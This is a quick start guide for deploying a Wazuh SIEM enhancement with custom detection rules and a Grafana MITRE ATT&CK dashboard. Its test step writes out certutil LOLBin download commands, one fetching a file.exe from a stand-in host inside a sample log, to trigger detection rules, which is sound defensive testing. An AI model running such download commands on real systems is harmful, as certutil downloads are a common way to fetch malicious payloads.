# Quick Start Guide - 15 Minute Deployment

Get Wazuh SIEM Enhancement up and running in 15 minutes.

## ⚡ Prerequisites Check (2 minutes)

```bash
# Verify Wazuh is installed
/var/ossec/bin/wazuh-control info

# Verify Elasticsearch is running
curl -X GET "localhost:9200"

# Verify Grafana is accessible
systemctl status grafana-server
```

**Requirements:**
- ✅ Wazuh 4.8+ installed and running
- ✅ Elasticsearch accessible on port 9200
- ✅ Grafana installed and accessible on port 3000
- ✅ Root/sudo access

---

## 🚀 Step 1: Clone Repository (1 minute)

```bash
cd /tmp
git clone https://github.com/bajraroshan/wazuh-siem-enhancement.git
cd wazuh-siem-enhancement
```

---

## 📦 Step 2: Deploy Detection Rules (5 minutes)

### Automated Deployment (Recommended)

```bash
# Make script executable
chmod +x scripts/deploy_rules.sh

# Run deployment with automatic backup
sudo ./scripts/deploy_rules.sh

# Verify deployment
sudo /var/ossec/bin/wazuh-logtest -t | grep "Total rules enabled"
```

### Manual Deployment (Alternative)

```bash
# Backup existing configuration
sudo cp /var/ossec/etc/ossec.conf /var/ossec/etc/ossec.conf.backup

# Copy rules file
sudo cp rules/custom_detection_rules.xml /var/ossec/etc/rules/

# Set permissions
sudo chown wazuh:wazuh /var/ossec/etc/rules/custom_detection_rules.xml
sudo chmod 640 /var/ossec/etc/rules/custom_detection_rules.xml

# Update ossec.conf (add before </ruleset>)
sudo nano /var/ossec/etc/ossec.conf
# Add: <include>custom_detection_rules.xml</include>

# Restart Wazuh
sudo systemctl restart wazuh-manager
```

**✅ Checkpoint:** Rules deployed, Wazuh restarted successfully

---

## 📊 Step 3: Import Dashboard (5 minutes)

### Configure Elasticsearch Datasource (if not already done)

1. Access Grafana: `http://your-server:3000`
2. Login (default: admin/admin)
3. Navigate: **Configuration** (⚙️) → **Data Sources** → **Add data source**
4. Select: **Elasticsearch**
5. Configure:
   ```
   Name: Wazuh-Alerts
   URL: http://localhost:9200
   Index name: wazuh-alerts-*
   Time field: timestamp
   Version: 7.10+
   ```
6. Click: **Save & Test** → Should see "Data source is working"

### Import Dashboard

1. Navigate: **Dashboards** (📊) → **Import**
2. Click: **Upload JSON file**
3. Select: `dashboards/wazuh-mitre-attack-advanced-threat-analysis.json`
4. Configure:
   - **Name:** Wazuh - MITRE ATT&CK Advanced Threat Analysis
   - **Folder:** (Create "Wazuh Dashboards")
   - **Datasource:** Select "Wazuh-Alerts"
5. Click: **Import**

**✅ Checkpoint:** Dashboard imported, all panels visible

---

## 🧪 Step 4: Generate Test Alerts (2 minutes)

### Quick Test

```bash
# Test LOLBin detection (Certutil)
echo '2025-10-24 10:30:45 WinEvtLog: Security: AUDIT_SUCCESS(4688): Microsoft-Windows-Security-Auditing: (no user): no domain: TESTHOST: New Process Created. Creator Process Name: C:\Windows\System32\cmd.exe New Process Name: C:\Windows\System32\certutil.exe Command Line: certutil.exe -urlcache -split -f http://test.com/file.exe' | sudo /var/ossec/bin/wazuh-logtest

# Expected output: Rule 100100 should trigger
```

### Production Testing (on Windows agent)

```powershell
# Safe test - downloads harmless text file
certutil.exe -urlcache -split -f https://www.example.com/robots.txt test.txt

# Check alert appeared
# Navigate to Grafana dashboard
# Refresh and look for "Certutil download" alert
```

**✅ Checkpoint:** Test alert generated and visible in dashboard

---

## ✅ Verification Checklist

Run through this checklist to confirm successful deployment:

### Detection Rules
- [ ] 33 custom rules deployed
- [ ] Rules appear in wazuh-logtest output
- [ ] No errors in `/var/ossec/logs/ossec.log`
- [ ] Test alert triggers successfully

### Dashboard
- [ ] All 5 sections load without errors
- [ ] Elasticsearch datasource connected
- [ ] Panels display data (or show "No data" appropriately)
- [ ] No red error messages in browser console

### System Health
- [ ] Wazuh manager status: Active (running)
- [ ] Elasticsearch status: Green/Yellow
- [ ] Grafana accessible and responsive
- [ ] No performance degradation

---

## 🎯 Next Steps

### Immediate (First Hour)

1. **Review Dashboard Sections:**
   - Overview & Statistics
   - LOLBins Detection
   - Fileless Malware
   - APT Detection & Risk Scoring
   - Attack Chain Timeline

2. **Configure Refresh Rate:**
   - Dashboard settings → Auto refresh
   - Recommended: 30 seconds for active monitoring

3. **Bookmark Dashboard:**
   - Add to Grafana favorites
   - Share URL with team

### First Day

1. **Read User Guide:**
   ```bash
   cat docs/dashboard-user-guide.md
   ```

2. **Generate More Test Cases:**
   ```bash
   # Test fileless detection
   cat test_cases/fileless_test_logs.txt | sudo /var/ossec/bin/wazuh-logtest
   
   # Test APT simulation
   cat test_cases/apt_simulation_logs.txt | sudo /var/ossec/bin/wazuh-logtest
   ```

3. **Baseline Normal Activity:**
   - Monitor dashboard for 24-48 hours
   - Identify false positives
   - Document legitimate use cases

### First Week

1. **Tune Detection Rules:**
   - Review alerts by frequency
   - Adjust severity levels if needed
   - Add exceptions for approved tools
   
2. **Create Response Playbooks:**
   - Document procedures for each alert type
   - Define escalation criteria
   - Assign responsibilities

3. **Train Team:**
   - Walk through dashboard sections
   - Practice incident investigation
   - Document common scenarios

---

## 📚 Essential Documentation

| Document | Purpose | Time to Read |
|----------|---------|--------------|
| [Installation Guide](docs/installation-guide.md) | Detailed setup | 20 min |
| [Dashboard User Guide](docs/dashboard-user-guide.md) | Analyst workflows | 30 min |
| [Troubleshooting Guide](docs/troubleshooting-guide.md) | Common issues | 15 min |
| [MITRE ATT&CK Mapping](docs/mitre-attack-mapping.md) | Technique coverage | 10 min |

---

## 🔧 Common Issues & Quick Fixes

### Issue: Dashboard Shows "No Data"

**Quick Fix:**
```bash
# 1. Check time range (top-right in dashboard)
# Change to "Last 24 hours" or "Last 7 days"

# 2. Verify alerts exist
curl -X GET "localhost:9200/wazuh-alerts-*/_count?pretty"

# 3. Generate test alert
echo 'test_log' | sudo /var/ossec/bin/wazuh-logtest
```

### Issue: Rules Not Triggering

**Quick Fix:**
```bash
# 1. Verify rules loaded
sudo /var/ossec/bin/wazuh-logtest -t | grep "Total rules enabled"

# 2. Check ossec.conf includes custom rules
sudo grep "custom_detection_rules.xml" /var/ossec/etc/ossec.conf

# 3. Restart Wazuh
sudo systemctl restart wazuh-manager
```

### Issue: Wazuh Manager Won't Start

**Quick Fix:**
```bash
# 1. Check logs for errors
sudo tail -50 /var/ossec/logs/ossec.log

# 2. Validate configuration
sudo /var/ossec/bin/wazuh-logtest -t

# 3. Check file permissions
sudo ls -l /var/ossec/etc/rules/custom_detection_rules.xml
# Should be: -rw-r----- wazuh wazuh
```

### Issue: Grafana Datasource Error

**Quick Fix:**
```bash
# 1. Verify Elasticsearch is running
curl -X GET "localhost:9200"

# 2. Check firewall
sudo ufw status
sudo ufw allow 9200/tcp

# 3. Test connection from Grafana host
curl -X GET "http://<elasticsearch-host>:9200"
```

---

## 💡 Pro Tips

### Tip 1: Use Dashboard Variables

Filter dashboard by specific hosts or time ranges:
- Click on variables at top of dashboard
- Select specific agent names
- Choose severity levels

### Tip 2: Create Dashboard Snapshots

Share current threat landscape with management:
- Dashboard → Share → Snapshot
- Set expiration time
- Share URL

### Tip 3: Set Up Alerting

Configure Grafana alerts for critical events:
- Panel → Alert → Create Alert Rule
- Example: Alert when High-Risk Hosts count > 5

### Tip 4: Regular Backups

Automate configuration backups:
```bash
# Add to crontab
0 2 * * * /path/to/wazuh-siem-enhancement/scripts/export_dashboard.sh
```

### Tip 5: Monitor Performance

Track dashboard query performance:
- Panel → Inspect → Query
- Optimize slow queries (>5 seconds)
- Consider index optimization if needed

---

## 🆘 Getting Help

### Self-Service

1. **Search Existing Issues:**
   https://github.com/bajraroshan/wazuh-siem-enhancement/issues

2. **Check Discussions:**
   https://github.com/bajraroshan/wazuh-siem-enhancement/discussions

3. **Review Documentation:**
   Browse `docs/` directory

### Community Support

- **GitHub Issues:** Report bugs, request features
- **GitHub Discussions:** Ask questions, share experiences
- **Wazuh Community:** https://groups.google.com/g/wazuh

### Commercial Support

For production deployments requiring SLA:
- Contact: support@yourproject.com
- Include: Environment details, logs, screenshots

---

## 🎉 Success Criteria

You've successfully deployed Wazuh SIEM Enhancement when:

✅ All 33 custom detection rules are active  
✅ Dashboard displays real-time threat data  
✅ Test alerts trigger and appear in visualization  
✅ No errors in Wazuh, Elasticsearch, or Grafana logs  
✅ Team can access and navigate dashboard  
✅ Performance is acceptable (queries <5 seconds)  

---

## 📊 Deployment Timeline Summary

| Step | Duration | Cumulative |
|------|----------|------------|
| Prerequisites Check | 2 min | 2 min |
| Clone Repository | 1 min | 3 min |
| Deploy Detection Rules | 5 min | 8 min |
| Import Dashboard | 5 min | 13 min |
| Generate Test Alerts | 2 min | 15 min |

**Total:** ~15 minutes for basic deployment

**Production-Ready:** Add 2-4 hours for:
- Documentation review
- Team training
- False positive tuning
- Response playbook creation

---

## 🚦 What's Next?

### Immediate Goals (First Week)
- [ ] Establish baseline normal activity
- [ ] Identify and tune false positives
- [ ] Create response playbooks
- [ ] Train SOC team on dashboard

### Short-Term Goals (First Month)
- [ ] Integrate with ticketing system
- [ ] Develop custom rules for environment
- [ ] Implement alerting for critical events
- [ ] Conduct tabletop exercises

### Long-Term Goals (First Quarter)
- [ ] Measure MTTR improvement
- [ ] Expand detection coverage
- [ ] Contribute back to community
- [ ] Plan D3FEND integration

---

## 📞 Quick Reference

**Wazuh Manager:**
```bash
# Start/Stop/Restart
sudo systemctl start|stop|restart wazuh-manager

# Check status
sudo systemctl status wazuh-manager

# View logs
sudo tail -f /var/ossec/logs/ossec.log
```

**Elasticsearch:**
```bash
# Check health
curl -X GET "localhost:9200/_cluster/health?pretty"

# Check indices
curl -X GET "localhost:9200/_cat/indices/wazuh-alerts-*?v"

# Count alerts
curl -X GET "localhost:9200/wazuh-alerts-*/_count?pretty"
```

**Grafana:**
```bash
# Start/Stop/Restart
sudo systemctl start|stop|restart grafana-server

# Check status
sudo systemctl status grafana-server

# View logs
sudo tail -f /var/log/grafana/grafana.log
```

---

**🎊 Congratulations! You've successfully deployed Wazuh SIEM Enhancement!**

**Questions? → [GitHub Discussions](https://github.com/bajraroshan/wazuh-siem-enhancement/discussions)**

**Found a bug? → [Report Issue](https://github.com/bajraroshan/wazuh-siem-enhancement/issues/new)**